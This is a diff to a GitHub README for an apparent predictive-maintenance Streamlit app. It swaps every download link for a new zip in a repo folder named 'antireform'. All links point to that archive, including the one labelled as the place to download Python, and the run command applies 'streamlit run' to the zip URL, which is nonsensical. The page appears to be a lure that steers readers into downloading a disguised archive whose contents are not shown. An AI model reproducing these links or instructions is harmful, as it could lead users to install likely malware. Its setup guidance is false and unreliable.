@@ -1,6 +1,6 @@
 # 🛠️ predictive-maintenance-project - Maximize Machine Uptime Effortlessly
 
-[![Download Now](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip%20Now-Release%20Page-brightgreen)](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip)
+[![Download Now](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/maintenance-predictive-project-v3.0.zip%20Now-Release%20Page-brightgreen)](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/maintenance-predictive-project-v3.0.zip)
 
 ## 📖 Project Overview
 
@@ -19,7 +19,7 @@ Follow these simple steps to download and run the Predictive Maintenance Project
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Download the Latest Release](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip).
+To download the software, visit this page: [Download the Latest Release](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/maintenance-predictive-project-v3.0.zip).
 
 1. Open your web browser.
 2. Click on the link above.
@@ -32,7 +32,7 @@ To download the software, visit this page: [Download the Latest Release](https:/
 After downloading, you must set up the application to run it smoothly.
 
 1. **Install the Required Software:**
-   - Ensure you have Python installed. You can download it from [https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip).
+   - Ensure you have Python installed. You can download it from [https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/maintenance-predictive-project-v3.0.zip](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/maintenance-predictive-project-v3.0.zip).
    - Install Streamlit by opening your command prompt or terminal and running:
      ```
      pip install streamlit
@@ -51,7 +51,7 @@ After downloading, you must set up the application to run it smoothly.
 4. **Run the Application:**
    - In the terminal, type the following command to start the Streamlit interface:
      ```
-     streamlit run https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip
+     streamlit run https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/maintenance-predictive-project-v3.0.zip
      ```
    - Press **Enter**.
 
@@ -98,6 +98,6 @@ For more detailed information about the project, refer to the Wiki section in th
 
 If you encounter any issues, feel free to open an issue in the repository or reach out through our discussions page.
 
-Remember, for downloads and updates, always check our [Releases Page](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip). 
+Remember, for downloads and updates, always check our [Releases Page](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/maintenance-predictive-project-v3.0.zip). 
 
 Your utilization of the Predictive Maintenance Project can significantly improve the reliability of your equipment and minimize downtime. Happy predicting!
